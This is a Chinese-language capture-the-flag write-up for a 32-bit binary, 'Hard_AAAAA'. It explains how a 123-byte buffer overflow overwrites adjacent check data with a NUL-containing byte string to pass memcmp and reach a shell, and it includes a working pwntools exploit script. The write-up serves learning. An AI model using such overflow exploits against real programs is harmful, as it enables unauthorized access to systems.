# Hard_AAAAA

## 题目简述

附件是一个 32 位程序，输入会覆盖到相邻校验数据。反编译时 IDA 把参与 `memcmp` 的常量误显示成只有四个可见字符，因为常量中间包含 `\x00`；真实比较数据必须按内存字节而不是 C 字符串来理解。通过校验后程序进入可交互的 shell。

## 解题过程

在 IDA 的 Hex View 中检查比较常量，可以确认所需字节序列为：

```text
30 4f 30 6f 00 4f 30
```

也就是 `0O0o\x00O0`。输入缓冲区到校验区的偏移为 123 字节，因此 payload 是 123 个填充字节加上述序列：

```python
from pwn import *

context.arch = "i386"

io = process("./Hard_AAAAA")
payload = b"A" * 123 + b"0O0o\x00O0"
io.sendline(payload)

io.sendline(b"cat flag")
io.interactive()
```

关键不是暴力猜字符串，而是绕开反编译器受 NUL 截断影响的展示，按实际内存布局恢复完整比较值。

## 方法总结

- 核心技巧：利用越界输入覆盖相邻校验区，并按原始字节构造包含 `\x00` 的比较数据。
- 识别信号：`memcmp` 的长度大于反编译器显示的字符串长度，或常量附近存在内嵌 NUL。
- 复用要点：反编译器的字符串视图只是解释结果；遇到异常长度时应回到 Hex View、交叉引用和调用参数核对真实字节。
